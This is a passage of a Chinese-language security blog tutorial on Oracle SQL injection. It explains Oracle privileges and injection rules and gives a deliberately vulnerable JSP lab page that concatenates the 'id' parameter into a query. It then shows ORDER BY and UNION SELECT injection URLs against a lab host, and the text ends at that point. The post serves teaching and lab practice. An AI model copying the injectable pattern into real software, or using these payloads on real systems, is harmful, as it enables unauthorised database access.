<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Oracle数据库注入攻击方式 | Ulysses'Blog</title><meta name="keywords" content="SQL注入"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Oracle数据库的基本知识Oracle数据库介绍Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。 Ora">
<meta property="og:type" content="article">
<meta property="og:title" content="Oracle数据库注入攻击方式">
<meta property="og:url" content="https://plumeria.ltd/post/ec74cb90.html">
<meta property="og:site_name" content="Ulysses&#39;Blog">
<meta property="og:description" content="Oracle数据库的基本知识Oracle数据库介绍Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。 Ora">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://plumeria.ltd/img/cover/oracle.jpg">
<meta property="article:published_time" content="2021-10-05T16:43:39.000Z">
<meta property="article:modified_time" content="2021-10-08T14:40:15.786Z">
<meta property="article:author" content="Ulysses">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://plumeria.ltd/img/cover/oracle.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/ec74cb90"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"W86Z4BMIXY","apiKey":"ab43a60eaebc9c628f7b1eb55825160f","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Oracle数据库注入攻击方式',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-10-08 22:40:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6971899287" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/oracle.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Oracle数据库注入攻击方式</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-05T16:43:39.000Z" title="发表于 2021-10-06 00:43:39">2021-10-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-08T14:40:15.786Z" title="更新于 2021-10-08 22:40:15">2021-10-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Oracle数据库注入攻击方式"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Oracle数据库的基本知识"><a href="#Oracle数据库的基本知识" class="headerlink" title="Oracle数据库的基本知识"></a>Oracle数据库的基本知识</h2><h3 id="Oracle数据库介绍"><a href="#Oracle数据库介绍" class="headerlink" title="Oracle数据库介绍"></a>Oracle数据库介绍</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p>
<p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。</p>
<p>Oracle服务默认端口：1521</p>
<h3 id="Oracle权限分类"><a href="#Oracle权限分类" class="headerlink" title="Oracle权限分类"></a>Oracle权限分类</h3><p>权限是用户对一项功能的执行权力。在Oracle中，根据系统管理方式不同，将Oracle权限分为系统权限与实体权限两类。系统权限是指是否被授权用户可以连接到数据库上，在数据库中可以进行哪些系统操作。而实体权限是指用户对具体的模式实体(schema)所拥有的权限。</p>
<p>系统权限：系统规定用户使用数据库的权限。（系统权限是对用户而言)。</p>
<p>实体权限：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）。</p>
<h4 id="系统权限管理"><a href="#系统权限管理" class="headerlink" title="系统权限管理"></a>系统权限管理</h4><p>—— 系统权限分类 ——</p>
<ul>
<li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li>
<li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li>
<li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。</li>
</ul>
<p>对于普通用户：授予connect, resource权限。</p>
<p>对于DBA管理用户：授予connect，resource, dba权限。</p>
<blockquote>
<p>系统权限授权命令： 系统权限只能由DBA用户授出：sys, system(最开始只能是这两个用户) 授权命令：SQL&gt; grant connect, resource, dba to 用户名1 [,用户名2]…; 注:普通用户通过授权可以具有与system相同的用户权限，但永远不能达到与sys用户相同的权限，system用户的权限也可以被回收。 例： SQL&gt; connect system/manager SQL&gt; Create user user50 identified by user50; SQL&gt; grant connect, resource to user50;</p>
<p>查询用户拥有哪里权限： SQL&gt; select * from dba_role_privs; SQL&gt; select * from dba_sys_privs; SQL&gt; select * from role_sys_privs;</p>
<p>查自己拥有哪些系统权限 SQL&gt; select * from session_privs;</p>
<p>删除用户 SQL&gt; drop user 用户名 cascade; //加上cascade则将用户连同其创建的东西全部删除</p>
<p>系统权限传递：增加WITH ADMIN OPTION选项，则得到的权限可以传递。 SQL&gt; grant connect, resorce to user50 with admin option; //可以传递所获权限。</p>
<p>系统权限回收：系统权限只能由DBA用户回收 SQL&gt; Revoke connect, resource from user50;</p>
<p>说明： 1）如果使用WITH ADMIN OPTION为某个用户授予系统权限，那么对于被这个用户授予相同权限的所有用户来说，取消该用户的系统权限并不会级联取消这些用户的相同权限。 2）系统权限无级联，即A授予B权限，B授予C权限，如果A收回B的权限，C的权限不受影响；系统权限可以跨用户回收，即A可以直接收回C用户的权限。</p>
</blockquote>
<h4 id="实体权限管理"><a href="#实体权限管理" class="headerlink" title="实体权限管理"></a>实体权限管理</h4><p>—— 实体权限分类 ——</p>
<ul>
<li>select, update, insert, alter, index, delete, all //all包括所有权限</li>
<li>execute //执行存储过程权限</li>
</ul>
<blockquote>
<p>user01: SQL&gt; grant select, update, insert on product to user02; SQL&gt; grant all on product to user02;</p>
<p>user02: SQL&gt; select * from user01.product; // 此时user02查user_tables，不包括user01.product这个表，但如果查all_tables则可以查到，因为他可以访问。</p>
<p>将表的操作权限授予全体用户： SQL&gt; grant all on product to public; // public表示是所有的用户，这里的all权限不包括drop。</p>
<p>实体权限数据字典 SQL&gt; select owner, table_name from all_tables; // 用户可以查询的表 SQL&gt; select table_name from user_tables; // 用户创建的表 SQL&gt; select grantor, table_schema, table_name, privilege from all_tab_privs; // 获权可以存取的表（被授权的） SQL&gt; select grantee, owner, table_name, privilege from user_tab_privs; // 授出权限的表(授出的权限)</p>
<p>DBA用户可以操作全体用户的任意基表(无需授权，包括删除)：</p>
<p>DBA用户： SQL&gt; Create table stud02.product( id number(10), name varchar2(20)); SQL&gt; drop table stud02.emp;</p>
<p>SQL&gt; create table stud02.employee as select * from scott.emp;</p>
<p>实体权限传递(with grant option)：</p>
<p>user01: SQL&gt; grant select, update on product to user02 with grant option; // user02得到权限，并可以传递。</p>
<p>实体权限回收：</p>
<p>user01: SQL&gt;Revoke select, update on product from user02; //传递的权限将全部丢失。</p>
<p>说明 1）如果取消某个用户的对象权限，那么对于这个用户使用WITH GRANT OPTION授予权限的用户来说，同样还会取消这些用户的相同权限，也就是说取消授权时级联的。</p>
</blockquote>
<h4 id="管理角色"><a href="#管理角色" class="headerlink" title="管理角色"></a>管理角色</h4><blockquote>
<p>建一个角色 sql&gt;create role role1;</p>
<p>授权给角色 sql&gt;grant create any table,create procedure to role1;</p>
<p>授予角色给用户 sql&gt;grant role1 to user1;</p>
<p>查看角色所包含的权限 sql&gt;select * from role_sys_privs;</p>
<p>创建带有口令以角色(在生效带有口令的角色时必须提供口令) sql&gt;create role role1 identified by password1;</p>
<p>修改角色：是否需要口令 sql&gt;alter role role1 not identified; sql&gt;alter role role1 identified by password1;</p>
<p>设置当前用户要生效的角色 (注：角色的生效是一个什么概念呢？假设用户a有b1,b2,b3三个角色，那么如果b1未生效，则b1所包含的权限对于a来讲是不拥有的，只有角色生效了，角色内的权限才作用于用户，最大可生效角色数由参数MAX_ENABLED_ROLES设定；在用户登录后，oracle将所有直接赋给用户的权限和用户默认角色中的权限赋给用户。） sql&gt;set role role1; //使role1生效 sql&gt;set role role,role2; //使role1,role2生效 sql&gt;set role role1 identified by password1; //使用带有口令的role1生效 sql&gt;set role all; //使用该用户的所有角色生效 sql&gt;set role none; //设置所有角色失效 sql&gt;set role all except role1; //除role1外的该用户的所有其它角色生效。 sql&gt;select * from SESSION_ROLES; //查看当前用户的生效的角色。</p>
<p>修改指定用户，设置其默认角色 sql&gt;alter user user1 default role role1; sql&gt;alter user user1 default role all except role1;</p>
<p>删除角色 sql&gt;drop role role1;</p>
<p>角色删除后，原来拥用该角色的用户就不再拥有该角色了，相应的权限也就没有了。</p>
<p>说明: 1)无法使用WITH GRANT OPTION为角色授予对象权限 2)可以使用WITH ADMIN OPTION 为角色授予系统权限,取消时不是级联</p>
</blockquote>
<h3 id="PL-SQL语言"><a href="#PL-SQL语言" class="headerlink" title="PL/SQL语言"></a>PL/SQL语言</h3><p>PL/SQL也是一种程序语言，叫做过程化SQL语言（Procedual Language/SQL）。</p>
<p>PL/SQL是Oracle数据库对SQL语句的扩展。在普通SQL语句的使用上增加了编程语言的特点，所以PL/SQL就是把数据操作和查询语句组织在PL/SQL代码的过程性单元中，通过逻辑判断、循环等操作实现复杂的功能或者计算的程序语言。 在PL/SQL编程语言是由甲骨文公司在20世纪80年代，作为SQL程序扩展语言和Oracle关系数据库开发。</p>
<p>基本存储过程结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">    &lt;declarations section&gt;</span><br><span class="line">BEGIN</span><br><span class="line">    &lt;executable command(s)&gt;</span><br><span class="line">EXCEPTION</span><br><span class="line">    &lt;exception handing&gt;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入需注意的规则"><a href="#SQL注入需注意的规则" class="headerlink" title="SQL注入需注意的规则"></a>SQL注入需注意的规则</h3><ol>
<li> Oracle使用查询语言获取需要跟上表名，这一点和Access类似，没有表的情况下可以使用dual表，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</li>
<li> Oracle的数据库类型是强匹配，所以在Oracle进行类似Union查询数据时必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用NULL代替某些无法快速猜测出的数据类型位置，这一点和SQLServer类似。</li>
<li> Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页 例如: <code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</code></li>
<li> Oracle的单行注释符号是<code>--</code>，多行注释符号<code>/**/</code>。</li>
<li> Oracle 数据库包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名。</li>
<li> Oracle使用<code>||</code>拼接字符串（在URL中使用编码<code>%7c</code>表示），<code>concat()</code>函数也可以实现两个字符串的拼接</li>
</ol>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows Server 2008R2</li>
<li>数据库：Microsoft SQL Server 2008R2</li>
<li>Web服务器：Tomcat 7.0</li>
<li>脚本语言：jsp</li>
<li>源代码：index.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>  pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.jdbc.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.sql.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath = request.getScheme()+<span class="string">&quot;://&quot;</span>+request.getServerName()+<span class="string">&quot;:&quot;</span>+request.getServerPort()+path+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath%&gt;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;title&gt;Oracle注入测试&lt;/title&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;expires&quot;</span> content=<span class="string">&quot;0&quot;</span>&gt;    </span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;This is my page&quot;</span>&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;styles.css&quot;</span> mce_href=<span class="string">&quot;styles.css&quot;</span>&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;body&gt; </span><br><span class="line">    &lt;%</span><br><span class="line">        String  url  =  <span class="string">&quot;http://&quot;</span>  +  request.getServerName()  +  <span class="string">&quot;:&quot;</span>  +  request.getServerPort()  +  request.getContextPath()+request.getServletPath();</span><br><span class="line">            Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>).newInstance();</span><br><span class="line">            Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">            ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">            String oraUrl=<span class="string">&quot;jdbc:oracle:thin:@127.0.0.1:1521:orcl&quot;</span>;</span><br><span class="line">            String oraUser=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">            String oraPWD=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                    DriverManager.registerDriver(<span class="keyword">new</span> oracle.jdbc.driver.OracleDriver());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                out.print(<span class="string">&quot;filed!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);</span><br><span class="line">                String sql=<span class="string">&quot;select * from news where id=&quot;</span>+request.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;执行语句:&lt;br&gt;&quot;</span>+sql+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">                stmt = conn.createStatement();</span><br><span class="line">                rs = stmt.executeQuery(sql);</span><br><span class="line">                out.print(<span class="string">&quot;结果为:&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;table border=&#x27;1&#x27; cellpadding=&#x27;4&#x27; cellspacing=&#x27;0&#x27; style=&#x27;background-color:White;border-color:#3366CC;border-width:1px;border-style:None;width:203px;border-collapse:collapse;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#CCCCFF;background-color:#003399;font-weight:bold;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;td&gt;id&lt;/td&gt;&lt;td&gt;title&lt;/td&gt;&lt;td&gt;content&lt;/td&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#003399;background-color:White;&#x27;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">while</span>(rs.next())</span><br><span class="line">                &#123;</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">1</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">2</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">3</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">                rs.close();</span><br><span class="line">                stmt.close();</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                    System.out.println(e.toString());</span><br><span class="line">                    out.print(e.toString());</span><br><span class="line">            &#125;</span><br><span class="line">     %&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>判断注入点的方式与之前的数据库注入一样，就不详细讲了。</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>依旧提交order by 去猜测显示当前页面所用的SQL查询了多少个字段，也就是确认查询字段数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 3 --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>

<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select null,null,null from dual --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

